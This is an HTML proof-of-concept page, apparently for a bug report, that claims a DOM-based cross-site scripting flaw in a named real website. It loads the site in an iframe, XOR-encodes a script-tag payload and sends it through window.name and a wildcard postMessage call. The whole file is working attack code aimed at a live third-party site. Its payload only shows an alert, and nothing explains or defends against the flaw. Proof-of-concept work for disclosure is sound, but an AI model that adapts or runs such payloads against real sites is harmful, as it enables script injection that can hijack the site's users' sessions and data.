<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>XSS PoC</title>
</head>
<body>
  <h2>âœ… PoC: DOM XSS</h2>
  <iframe id="target" src="https://thebrowser.company/" width="100%" height="600"></iframe>

  <script>
    function xorEncode(str, key = 0x66) {
      const keyHex = key.toString(16).padStart(2, '0');
      const encoded = Array.from(str).map(c => {
        return (c.charCodeAt(0) ^ key).toString(16).padStart(2, '0');
      }).join('');
      return keyHex + encoded;
    }

    const payload = "<script>alert(1)</script>";
    const encoded = xorEncode(payload);

    const iframe = document.getElementById("target");
    iframe.onload = () => {
      iframe.contentWindow.name = encoded;
      setTimeout(() => {
        iframe.contentWindow.postMessage(encoded, "*");
        console.log("ðŸš€ Payload sent via postMessage + window.name");
      }, 1000);
    };
  </script>
</body>
</html>
